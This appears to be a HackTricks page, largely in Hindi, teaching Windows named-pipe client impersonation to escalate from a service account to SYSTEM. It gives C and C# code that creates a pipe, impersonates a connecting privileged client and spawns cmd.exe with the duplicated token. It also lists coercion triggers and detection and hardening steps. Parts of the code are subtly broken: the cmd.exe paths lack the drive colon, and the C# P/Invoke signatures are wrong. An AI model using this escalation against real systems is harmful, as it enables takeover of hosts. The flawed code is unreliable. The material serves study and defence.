# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation एक local privilege escalation primitive है जो एक named-pipe server thread को उस client के security context को अपना लेने देता है जो इसके साथ connect करता है। व्यवहार में, एक attacker जो SeImpersonatePrivilege के साथ code चला सकता है, वह एक privileged client (उदा., एक SYSTEM service) को attacker-controlled pipe से connect कराने के लिए मजबूर कर सकता है, ImpersonateNamedPipeClient को कॉल कर सकता है, resulting token को primary token में duplicate कर सकता है, और client के रूप में (अक्सर NT AUTHORITY\SYSTEM) एक process spawn कर सकता है।

यह पेज core technique पर केंद्रित है। SYSTEM को आपके pipe से जोड़ने वाले end-to-end exploit chains के लिए, नीचे संदर्भित Potato family pages देखें।

## TL;DR
- Create a named pipe: \\.\pipe\<random> और connection का इंतजार करें।
- एक privileged component को इससे connect कराएँ (spooler/DCOM/EFSRPC/etc.)।
- pipe से कम से कम एक message पढ़ें, फिर ImpersonateNamedPipeClient को कॉल करें।
- वर्तमान thread से impersonation token खोलें, DuplicateTokenEx(TokenPrimary), और CreateProcessWithTokenW/CreateProcessAsUser का उपयोग करके एक SYSTEM process प्राप्त करें।

## आवश्यकताएँ और प्रमुख APIs
- कॉल करने वाली process/thread को सामान्यतः जिन privileges की आवश्यकता होती है:
- SeImpersonatePrivilege ताकि जुड़ने वाले client का सफलतापूर्वक impersonate किया जा सके और CreateProcessWithTokenW का उपयोग किया जा सके।
- वैकल्पिक रूप से, SYSTEM का impersonate करने के बाद, आप CreateProcessAsUser का उपयोग कर सकते हैं, जिसके लिए SeAssignPrimaryTokenPrivilege और SeIncreaseQuotaPrivilege की आवश्यकता हो सकती है (ये privileges तब संतुष्ट होते हैं जब आप SYSTEM का impersonate कर रहे हों)।
- मुख्य APIs जिनका उपयोग होता है:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (Impersonation से पहले कम से कम एक message पढ़ना आवश्यक है)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: स्थानीय रूप से उपयोगी क्रियाएँ करने के लिए, client को SecurityImpersonation की अनुमति देनी चाहिए (कई local RPC/named-pipe clients के लिए डिफ़ॉल्ट)। Clients pipe खोलते समय SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION के साथ इसे कम कर सकते हैं।

## न्यूनतम Win32 कार्यप्रवाह (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- यदि ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) लौटाता है, तो सुनिश्चित करें कि आप पहले pipe से पढ़ते हैं और कि client ने impersonation को Identification level तक सीमित नहीं किया है।
- प्रक्रिया बनाने के लिए उपयुक्त primary token बनाने हेतु DuplicateTokenEx को SecurityImpersonation और TokenPrimary के साथ प्राथमिकता दें।

## .NET त्वरित उदाहरण
.NET में, NamedPipeServerStream RunAsClient के माध्यम से impersonate कर सकता है। एक बार impersonation करने पर, thread token को duplicate करके एक process बनाएं।
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## सिस्टम को आपकी pipe तक लाने के सामान्य ट्रिगर/जबरदस्ती
ये तकनीकें विशेषाधिकार प्राप्त सेवाओं को आपकी named pipe से कनेक्ट करके उन्हें impersonate करने के लिए मजबूर करती हैं:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

विस्तृत उपयोग और अनुकूलता यहाँ देखें:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

यदि आपको केवल pipe तैयार करने और impersonate करके service trigger से SYSTEM spawn करने का पूरा उदाहरण चाहिए, तो देखें:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Troubleshooting और सावधानियाँ
- ImpersonateNamedPipeClient को कॉल करने से पहले आपको pipe से कम से कम एक संदेश पढ़ना होगा; अन्यथा आपको ERROR_CANNOT_IMPERSONATE (1368) मिलेगा।
- यदि client SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION के साथ कनेक्ट करता है, तो server पूरी तरह impersonate नहीं कर सकता; TokenImpersonationLevel के लिए GetTokenInformation के माध्यम से token का impersonation level जांचें।
- CreateProcessWithTokenW को caller पर SeImpersonatePrivilege चाहिए। यदि यह ERROR_PRIVILEGE_NOT_HELD (1314) के साथ विफल होता है, तो पहले SYSTEM का impersonate करने के बाद CreateProcessAsUser का उपयोग करें।
- यदि आप इसे harden करते हैं तो सुनिश्चित करें कि आपकी pipe का security descriptor target service को कनेक्ट करने की अनुमति देता है; डिफ़ॉल्ट रूप से, pipes under \\.\pipe server की DACL के अनुसार पहुँच योग्य होते हैं।

## Detection और hardening
- named pipe के निर्माण और कनेक्शनों की निगरानी करें। Sysmon Event IDs 17 (Pipe Created) और 18 (Pipe Connected) वैध pipe नामों के बेसलाइन के लिए और token-manipulation ईवेंट्स से पहले असामान्य, रैंडम दिखने वाले pipes पकड़ने के लिए उपयोगी हैं।
- निम्न क्रमों की तलाश करें: एक process pipe बनाता है, एक SYSTEM service कनेक्ट होता है, फिर बनानी वाली process SYSTEM के रूप में एक child spawn करती है।
- अनावश्यक service खातों से SeImpersonatePrivilege हटाकर और उच्च विशेषाधिकार वाले अनावश्यक service logons से बचकर जोखिम कम करें।
- Defensive development: untrusted named pipes से कनेक्ट करते समय SECURITY_SQOS_PRESENT के साथ SECURITY_IDENTIFICATION निर्दिष्ट करें ताकि servers अनावश्यक रूप से client का पूरी तरह impersonate न कर सकें।

## References
- Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
